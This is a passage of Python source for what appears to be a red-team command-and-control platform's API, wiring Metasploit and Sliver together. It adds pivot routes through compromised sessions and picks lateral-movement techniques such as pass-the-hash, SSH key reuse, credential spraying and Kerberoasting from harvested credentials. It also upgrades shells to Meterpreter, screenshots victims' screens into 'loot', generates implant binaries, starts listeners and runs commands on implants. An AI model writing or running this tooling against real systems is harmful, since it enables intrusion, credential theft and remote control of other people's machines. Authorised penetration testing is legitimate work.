    client = msf.get_client()
    if client:
        try:
            import time
            con = client.consoles.console()
            time.sleep(0.3)
            con.read()
            con.write(f"route add {req.subnet} {req.netmask} {session.msf_session_id}\n")
            time.sleep(0.5)
            result = con.read()
            msf_out = result.get("data", "") if isinstance(result, dict) else ""
            con.destroy()
        except Exception as e:
            msf_out = str(e)

    route_id = str(uuid.uuid4())
    routes.append({
        "id": route_id,
        "subnet": req.subnet,
        "netmask": req.netmask,
        "session_id": session.msf_session_id,
        "added_at": datetime.utcnow().isoformat(),
        "msf_result": msf_out[:200],
    })
    session.pivot_routes_json = json.dumps(routes)
    db.commit()
    return routes


@router.delete("/sessions/{session_id}/routes/{route_id}")
def remove_route(session_id: str, route_id: str, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    routes = json.loads(session.pivot_routes_json or "[]")
    route = next((r for r in routes if r["id"] == route_id), None)
    if not route:
        raise HTTPException(404, "Route not found")

    client = msf.get_client()
    if client and session.msf_session_id:
        try:
            import time
            con = client.consoles.console()
            time.sleep(0.3)
            con.read()
            con.write(f"route remove {route['subnet']} {route['netmask']} {session.msf_session_id}\n")
            time.sleep(0.5)
            con.read()
            con.destroy()
        except Exception:
            pass

    routes = [r for r in routes if r["id"] != route_id]
    session.pivot_routes_json = json.dumps(routes)
    db.commit()
    return routes


# ── Lateral Movement Automation ───────────────────────────────────────────────

def _derive_adjacent_subnets(ip: str, netmask: str = "255.255.255.0") -> list[str]:
    """Given a host IP, return the /24 subnet CIDR and adjacent /24 subnets."""
    import ipaddress as _ip
    try:
        net = _ip.IPv4Network(f"{ip}/{netmask}", strict=False)
        cidr = str(net)
        # Also suggest the next and previous /24 blocks
        base = int(_ip.IPv4Address(ip)) & 0xFFFFFF00
        adjacent = []
        for offset in (-256, 0, 256):
            try:
                candidate = str(_ip.IPv4Network(f"{_ip.IPv4Address(base + offset)}/24", strict=False))
                adjacent.append(candidate)
            except Exception:
                pass
        return list(dict.fromkeys([cidr] + adjacent))  # dedup preserving order
    except Exception:
        return []


_LATERAL_TECHNIQUES: list[dict] = [
    {
        "id": "psexec",
        "label": "PsExec (SMB / NTLM)",
        "platform": ["windows"],
        "requires": ["credential"],
        "msf_module": "exploit/windows/smb/psexec",
        "description": "Authenticate via SMB using harvested NTLM hash or plaintext credential.",
        "ports": [445],
    },
    {
        "id": "wmi_exec",
        "label": "WMI Remote Execution",
        "platform": ["windows"],
        "requires": ["credential"],
        "msf_module": "exploit/windows/local/wmi",
        "description": "Lateral movement via Windows Management Instrumentation.",
        "ports": [135, 445],
    },
    {
        "id": "pass_the_hash",
        "label": "Pass-the-Hash (PTH)",
        "platform": ["windows"],
        "requires": ["hash"],
        "msf_module": "exploit/windows/smb/psexec_psh",
        "description": "Use NTLM hashes from hashdump to authenticate without plaintext password.",
        "ports": [445],
    },
    {
        "id": "ssh_key",
        "label": "SSH Key Reuse",
        "platform": ["linux", "darwin"],
        "requires": ["key"],
        "msf_module": None,
        "description": "Reuse harvested SSH private keys against discovered Linux hosts.",
        "ports": [22],
    },
    {
        "id": "ssh_creds",
        "label": "SSH Credential Spray",
        "platform": ["linux", "darwin"],
        "requires": ["credential"],
        "msf_module": "auxiliary/scanner/ssh/ssh_login",
        "description": "Try harvested credentials against SSH on adjacent hosts.",
        "ports": [22],
    },
    {
        "id": "rdp_spray",
        "label": "RDP Credential Spray",
        "platform": ["windows"],
        "requires": ["credential"],
        "msf_module": "auxiliary/scanner/rdp/rdp_scanner",
        "description": "Try credentials against RDP on discovered Windows hosts.",
        "ports": [3389],
    },
    {
        "id": "meterpreter_pivot",
        "label": "Meterpreter Route Pivot",
        "platform": ["windows", "linux", "darwin"],
        "requires": [],
        "msf_module": None,
        "description": "Add MSF route through this session to reach hosts behind NAT/firewall.",
        "ports": [],
    },
    {
        "id": "kerberoast",
        "label": "Kerberoasting",
        "platform": ["windows"],
        "requires": ["domain"],
        "msf_module": "auxiliary/gather/get_user_spns",
        "description": "Request TGS tickets for domain service accounts and crack offline.",
        "ports": [88, 389],
    },
]


@router.post("/sessions/{session_id}/lateral-discover")
def lateral_discover(session_id: str, db: DBSession = Depends(get_db)):
    """
    Analyse a compromised session and return:
    - Adjacent subnets derived from the session IP / sysinfo
    - Applicable lateral movement techniques given harvested loot/creds
    - MSF post-module suggestions for network discovery
    """
    from database import Credential, LootEntry
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")

    platform = (session.platform or "").lower()
    remote_host = session.remote_host or ""

    # Derive subnets
    subnets: list[str] = []
    if remote_host:
        subnets = _derive_adjacent_subnets(remote_host)

    # Sysinfo enrichment
    sysinfo = {}
    if session.sysinfo_json:
        try:
            sysinfo = json.loads(session.sysinfo_json)
        except Exception:
            pass

    is_windows = "win" in platform or "windows" in (sysinfo.get("os") or "").lower()
    is_linux = "linux" in platform or "linux" in (sysinfo.get("os") or "").lower()
    is_domain = bool(sysinfo.get("domain"))

    # What credentials/loot do we have for this session?
    loot_entries = db.query(LootEntry).filter(LootEntry.session_id == session_id).all()
    cred_types: set[str] = set()
    for entry in loot_entries:
        lt = (entry.loot_type or "").lower()
        cred_types.add(lt)

    # Also check project-level credentials
    if session.project_id:
        creds = db.query(Credential).filter(
            Credential.project_id == session.project_id
        ).all()
        for c in creds:
            if c.hash:
                cred_types.add("hash")
            if c.username and c.password:
                cred_types.add("credential")
            if c.notes and "ssh" in c.notes.lower():
                cred_types.add("key")

    if is_domain:
        cred_types.add("domain")

    # Filter techniques to applicable ones
    applicable: list[dict] = []
    for tech in _LATERAL_TECHNIQUES:
        plats = tech["platform"]
        # Platform check
        if is_windows and "windows" not in plats:
            continue
        if is_linux and "linux" not in plats and "darwin" not in plats and not is_windows:
            continue
        # Requirements check
        reqs = tech["requires"]
        if reqs and not any(r in cred_types for r in reqs):
            continue
        applicable.append({
            "id": tech["id"],
            "label": tech["label"],
            "description": tech["description"],
            "msf_module": tech["msf_module"],
            "ports": tech["ports"],
        })

    # Always include pivot suggestion
    if not any(t["id"] == "meterpreter_pivot" for t in applicable):
        applicable.append({
            "id": "meterpreter_pivot",
            "label": "Meterpreter Route Pivot",
            "description": "Add MSF route through this session to reach hosts behind NAT/firewall.",
            "msf_module": None,
            "ports": [],
        })

    # Discovery post-modules
    discovery_modules = [
        {"name": "post/multi/gather/ping_sweep", "description": "ICMP ping sweep via Meterpreter"},
        {"name": "post/multi/recon/local_exploit_suggester", "description": "Local privilege escalation suggestions"},
    ]
    if is_windows:
        discovery_modules += [
            {"name": "post/windows/gather/arp_scanner", "description": "ARP table scan via Windows session"},
            {"name": "post/windows/gather/enum_domain_group_users", "description": "Enumerate domain group members"},
        ]
    if is_linux:
        discovery_modules += [
            {"name": "post/linux/gather/enum_network", "description": "Enumerate Linux network interfaces and routes"},
        ]

    # Mark pivot_check as done
    _tick_checklist(session, ["pivot_check"], db)
    db.commit()

    return {
        "session_id": session_id,
        "remote_host": remote_host,
        "platform": platform,
        "is_domain": is_domain,
        "subnets": subnets,
        "cred_types_available": sorted(cred_types),
        "techniques": applicable,
        "discovery_modules": discovery_modules,
    }


# ── Session upgrade ───────────────────────────────────────────────────────────

@router.post("/sessions/{session_id}/upgrade")
def upgrade_session(session_id: str, db: DBSession = Depends(get_db)):
    """Upgrade a shell session to Meterpreter via post/multi/manage/shell_to_meterpreter."""
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.msf_session_id:
        raise HTTPException(400, "Session has no MSF session ID")
    if "meterpreter" in (session.session_type or "").lower():
        raise HTTPException(400, "Session is already a Meterpreter session")

    def stream():
        import time
        client = msf.get_client()
        if not client:
            yield "data: [Error] Not connected to Metasploit\n\n"
            yield "data: [DONE]\n\n"
            return
        con = None
        try:
            con = client.consoles.console()
            time.sleep(0.3)
            con.read()
            con.write("use post/multi/manage/shell_to_meterpreter\n")
            time.sleep(0.3); con.read()
            con.write(f"set SESSION {session.msf_session_id}\n")
            time.sleep(0.1); con.read()
            con.write("run\n")
            deadline = time.time() + 120
            idle = 0
            while time.time() < deadline:
                time.sleep(0.8)
                chunk = con.read()
                data = chunk.get("data", "") if isinstance(chunk, dict) else ""
                if data:
                    for line in data.splitlines():
                        if line.strip():
                            yield f"data: {line}\n\n"
                    idle = 0
                else:
                    idle += 1
                    if not chunk.get("busy", True) and idle >= 2:
                        break
            yield "data: [DONE]\n\n"
        except Exception as e:
            yield f"data: [Error] {e}\n\n"
            yield "data: [DONE]\n\n"
        finally:
            if con:
                try: con.destroy()
                except Exception: pass

    return StreamingResponse(stream(), media_type="text/event-stream")


# ── Screenshot ────────────────────────────────────────────────────────────────

@router.post("/sessions/{session_id}/screenshot")
def take_screenshot(session_id: str, db: DBSession = Depends(get_db)):
    """Take a screenshot from a Meterpreter session and store as LootEntry."""
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.msf_session_id:
        raise HTTPException(400, "Session has no MSF session ID")
    if "meterpreter" not in (session.session_type or "").lower():
        raise HTTPException(400, "Screenshot requires a Meterpreter session")

    out = msf.session_run_command(session.msf_session_id, "screenshot -q 50", timeout=30)
    if not out:
        raise HTTPException(500, "Screenshot command returned no output")

    # Extract path from output: "Screenshot saved to: /tmp/xxxx.jpeg"
    import re as _re
    path_match = _re.search(r"saved to[:\s]+(\S+)", out, _re.IGNORECASE)
    path = path_match.group(1) if path_match else "unknown"

    entry = LootEntry(
        id=str(uuid.uuid4()),
        session_id=session_id,
        loot_type="file",
        title=f"Screenshot from {session.remote_host or 'session ' + session.msf_session_id}",
        content=out,
        source_path=path,
        captured_at=datetime.utcnow(),
    )
    db.add(entry)
    session.last_seen = datetime.utcnow()
    _tick_checklist(session, ["screenshot"], db)
    db.commit()
    db.refresh(entry)
    return {"loot_id": entry.id, "path": path, "output": out}


# ── Attack Plan (rule-based) ───────────────────────────────────────────────────

class AttackPlanRequest(BaseModel):
    project_id: str
    lhost: str = ""


def _detect_lhost(target_ip: str = "") -> str:
    """Return the local IP that routes toward target_ip, or best-guess outbound IP."""
    import socket
    try:
        probe = target_ip or "8.8.8.8"
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((probe, 80))
            return s.getsockname()[0]
    except Exception:
        return ""


@router.post("/attack-plan")
def generate_attack_plan(req: AttackPlanRequest, db: DBSession = Depends(get_db)):
    from database import Scan, Finding
    from services.attack_planner import plan

    project = db.query(Project).filter(Project.id == req.project_id).first()
    if not project:
        raise HTTPException(404, "Project not found")

    targets = db.query(Target).filter(Target.project_id == req.project_id).all()
    target_ids = [t.id for t in targets]
    scans = db.query(Scan).filter(Scan.target_id.in_(target_ids)).all() if target_ids else []
    scan_ids = [s.id for s in scans]
    findings = db.query(Finding).filter(Finding.scan_id.in_(scan_ids)).all() if scan_ids else []

    lhost = req.lhost or _detect_lhost(targets[0].hostname_or_ip if targets else "")

    return plan(targets, findings, lhost=lhost)


# ── Structured Sysinfo ────────────────────────────────────────────────────────

def _parse_sysinfo_text(raw: str) -> dict:
    """Parse raw sysinfo / systeminfo / uname output into a structured dict."""
    import re
    result: dict = {
        "hostname": None,
        "os": None,
        "arch": None,
        "username": None,
        "domain": None,
        "is_admin": None,
        "local_time": None,
        "raw": raw[:4000],  # store first 4k of raw output for reference
    }

    lines = raw.splitlines()

    for line in lines:
        stripped = line.strip()
        lower = stripped.lower()

        # Meterpreter sysinfo format: "Computer        : HOSTNAME"
        if lower.startswith("computer") and ":" in stripped:
            result["hostname"] = stripped.split(":", 1)[1].strip()
        elif lower.startswith("os") and ":" in stripped and result["os"] is None:
            result["os"] = stripped.split(":", 1)[1].strip()
        elif lower.startswith("architecture") and ":" in stripped:
            result["arch"] = stripped.split(":", 1)[1].strip()
        elif lower.startswith("system type") and ":" in stripped:
            result["arch"] = stripped.split(":", 1)[1].strip()
        elif lower.startswith("meterpreter") and ":" in stripped:
            result["arch"] = stripped.split(":", 1)[1].strip()
        elif lower.startswith("logged on users") and ":" in stripped:
            pass  # ignore
        elif lower.startswith("domain") and ":" in stripped and result["domain"] is None:
            val = stripped.split(":", 1)[1].strip()
            if val.upper() not in ("WORKGROUP", "N/A", ""):
                result["domain"] = val
        elif lower.startswith("local time") and ":" in stripped:
            result["local_time"] = stripped.split(":", 1)[1].strip()

        # Windows systeminfo
        elif lower.startswith("host name") and ":" in stripped:
            result["hostname"] = stripped.split(":", 1)[1].strip()
        elif lower.startswith("os name") and ":" in stripped:
            result["os"] = stripped.split(":", 1)[1].strip()
        elif lower.startswith("os version") and ":" in stripped and result["os"] is None:
            result["os"] = stripped.split(":", 1)[1].strip()
        elif lower.startswith("system boot time") and ":" in stripped:
            result["local_time"] = stripped.split(":", 1)[1].strip()

        # Linux uname -a  (e.g. "Linux hostname 5.15.0 #1 SMP x86_64 GNU/Linux")
        elif re.match(r"^(linux|darwin|freebsd)", lower):
            parts = stripped.split()
            if len(parts) >= 2:
                result["os"] = parts[0]
                result["hostname"] = parts[1]
            if len(parts) >= 12 and result["arch"] is None:
                result["arch"] = parts[-2]  # typically x86_64

        # id / getuid output
        elif lower.startswith("server username") and ":" in stripped:
            result["username"] = stripped.split(":", 1)[1].strip()
        elif re.match(r"uid=\d+\((\w+)\)", stripped):
            m = re.match(r"uid=\d+\((\w+)\)", stripped)
            if m:
                result["username"] = m.group(1)
            result["is_admin"] = "root" in stripped or "sudo" in stripped
        elif lower.startswith("whoami") or lower.startswith("nt authority"):
            result["username"] = stripped
        elif "\\" in stripped and result["username"] is None:
            # DOMAIN\Username format from getuid
            result["username"] = stripped
            if result["domain"] is None:
                result["domain"] = stripped.split("\\")[0]

    # is_admin heuristics
    if result["is_admin"] is None:
        if result["username"]:
            u = result["username"].lower()
            result["is_admin"] = "root" in u or "administrator" in u or "nt authority\\system" in u
        else:
            result["is_admin"] = False

    return result


class SysinfoParseRequest(BaseModel):
    raw_output: str


@router.post("/sessions/{session_id}/sysinfo")
def parse_session_sysinfo(session_id: str, req: SysinfoParseRequest, db: DBSession = Depends(get_db)):
    """Parse raw sysinfo/systeminfo/uname output and store structured data on the session."""
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    parsed = _parse_sysinfo_text(req.raw_output)
    session.sysinfo_json = json.dumps(parsed)
    # Tick the sysinfo + whoami checklist items
    _tick_checklist(session, ["sysinfo", "whoami"], db)
    db.commit()
    return parsed


@router.get("/sessions/{session_id}/sysinfo")
def get_session_sysinfo(session_id: str, db: DBSession = Depends(get_db)):
    """Return previously parsed sysinfo for a session."""
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.sysinfo_json:
        return {}
    return json.loads(session.sysinfo_json)


# ── LOTL Command Library ───────────────────────────────────────────────────────

@router.get("/lotl")
def get_lotl_library():
    """Return the living-off-the-land command library."""
    import json as _json
    from pathlib import Path as _Path
    lotl_path = _Path(__file__).parent.parent / "data" / "lotl_commands.json"
    with open(lotl_path) as f:
        return _json.load(f)


# ── Sliver C2 ─────────────────────────────────────────────────────────────────

import services.sliver_client as sliver


@router.get("/sliver/status")
def get_sliver_status():
    """Return Sliver connection status."""
    return sliver.status()


@router.get("/sliver/sessions")
def list_sliver_sessions():
    """Return live Sliver implant sessions."""
    return sliver.list_sessions()


@router.post("/sliver/sessions/sync")
def sync_sliver_sessions(project_id: str, db: DBSession = Depends(get_db)):
    """Pull live Sliver sessions and upsert Seraph C2Session records."""
    live = sliver.list_sessions()
    created = []
    for ls in live:
        existing = db.query(C2Session).filter(
            C2Session.msf_session_id == ls["sliver_id"],
            C2Session.project_id == project_id,
        ).first()
        if not existing:
            remote_host = ls.get("remote_host", "")
            target = None
            if remote_host:
                target = db.query(Target).filter(
                    Target.project_id == project_id,
                    Target.hostname_or_ip == remote_host,
                ).first()
            session = C2Session(
                id=str(uuid.uuid4()),
                project_id=project_id,
                target_id=target.id if target else None,
                msf_session_id=ls["sliver_id"],
                session_type=ls["session_type"],
                platform=ls.get("platform", ""),
                arch=ls.get("arch", ""),
                remote_host=remote_host,
                remote_port=ls.get("remote_port", ""),
                tunnel_peer=ls.get("tunnel_peer", ""),
                via_exploit="sliver-implant",
                via_payload=ls.get("via_payload", ""),
                status="active" if ls.get("status") == "active" else "inactive",
                checklist_json=json.dumps(_DEFAULT_CHECKLIST),
            )
            db.add(session)
            created.append(session.id)
    db.commit()
    return {"synced": len(live), "created": len(created)}


@router.get("/sliver/listeners")
def list_sliver_listeners():
    """Return running Sliver C2 listeners."""
    return sliver.list_listeners()


class SliverListenerRequest(BaseModel):
    protocol: str = "mtls"
    lhost: str
    lport: int


@router.post("/sliver/listeners")
def start_sliver_listener(req: SliverListenerRequest):
    """Start a Sliver listener."""
    result = sliver.start_listener(req.protocol, req.lhost, req.lport)
    if "error" in result:
        raise HTTPException(400, result["error"])
    return result


@router.delete("/sliver/listeners/{job_id}")
def stop_sliver_listener(job_id: str):
    """Kill a Sliver listener job."""
    result = sliver.stop_listener(job_id)
    if "error" in result:
        raise HTTPException(400, result["error"])
    return result


class SliverGenerateRequest(BaseModel):
    os_target: str = "linux"
    arch: str = "amd64"
    lhost: str
    lport: int
    protocol: str = "mtls"
    format: str = "exe"
    output_path: str = "/tmp/sliver_implant"


@router.post("/sliver/generate")
def generate_sliver_implant(req: SliverGenerateRequest):
    """Generate a Sliver implant binary."""
    result = sliver.generate_implant(
        os_target=req.os_target,
        arch=req.arch,
        lhost=req.lhost,
        lport=req.lport,
        protocol=req.protocol,
        format=req.format,
        output_path=req.output_path,
    )
    if "error" in result:
        raise HTTPException(400, result["error"])
    return result


@router.post("/sliver/sessions/{session_id}/exec")
def exec_sliver_command(session_id: str, req: RunCommandRequest):
    """Execute a command on a Sliver session."""
    result = sliver.exec_command(session_id, req.command, req.timeout)
    if "error" in result:
        raise HTTPException(400, result["error"])
    return result


@router.delete("/sliver/sessions/{session_id}")
def kill_sliver_session(session_id: str):
    """Kill a Sliver session."""
    result = sliver.kill_session(session_id)
    if "error" in result:
        raise HTTPException(400, result["error"])
    return result
